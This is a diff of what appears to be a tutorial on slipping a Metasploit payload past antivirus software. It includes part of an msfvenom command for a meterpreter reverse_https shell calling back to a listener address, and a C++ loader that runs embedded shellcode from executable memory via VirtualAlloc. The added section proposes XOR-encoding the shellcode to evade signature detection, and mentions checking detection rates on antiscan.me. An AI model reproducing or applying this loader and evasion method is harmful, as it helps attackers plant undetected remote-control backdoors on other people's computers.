@@ -55,7 +55,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 
 #include <string>
 using namespace std;
 
-int main(int argc, char **argv) {{
+int main(int argc, char **argv) {
     unsigned char buf[] =
     "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
     "\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -106,7 +106,7 @@ int main(int argc, char **argv) {{
     void *valloc = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(valloc, buf, sizeof buf);
     ((void(*)())valloc)();
-}}
+}
 ```
 
 I will now use antiscan.me, a service that offers a similar scan to VirusTotal, but uses fewer antivirus vendors. One of
@@ -121,3 +121,15 @@ want the binary to be made public. The detection rate has risen to 9 out of 26, 
 Step 3
 ------
 
+It is possible that antivirus programs will still detect the executable even if it has been embedded in a C script,
+because the meterpreter shellcode itself contains signatures that are known to antivirus programs. To try to get around
+this, you can XOR the shellcode before embedding it in the C script. XOR (or "exclusive OR") is a simple encryption
+operation that can be used to hide the shellcode signatures. However, it is important to note that this technique can be
+easily bypassed by antivirus software and does not guarantee that the binary will remain undetectable. It will be
+interesting to see if the use of an XOR on the shellcode has an impact on the detection of the binary by antivirus
+software and to compare the results obtained with and without this technique.
+
+
+```c
+
+```
